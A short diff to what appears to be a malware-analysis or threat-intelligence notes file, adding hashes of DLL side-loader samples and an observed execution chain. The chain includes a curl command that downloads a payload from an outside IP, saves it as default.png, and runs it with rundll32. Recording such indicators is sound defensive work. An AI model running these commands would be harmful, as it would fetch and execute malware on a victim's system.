@@ -6,6 +6,20 @@
 .js 6cb58c292627fd8502c10f8efa28384f3f291d64721e8fe318543408c1087a8c
 .dll 4a45b35fefffb07d6f659ab61f6930130e2dd946a0bc62d1319d3a15865fa509
 
+.dll side loader samples:
+
+.zip a837d65d4ae09d2141df82f4ade1e1191e652738e851767f3f4acbd7d7335c68
+.dll 56460c4133222841796c34b0d177a8c5e52b71de5e37d5b1cd098823bcbe9af0
+
+*************************************************
+Sideload Exec using write.exe >
+
+C:\Users\Admin\AppData\Local\Temp\document.exe
+
+curl http://109.172.45.9/Leq/15 -o c:\users\public\default.png
+
+rundll32 c:\users\public\default.png,print
+
 *************************************************
 
 Exec >
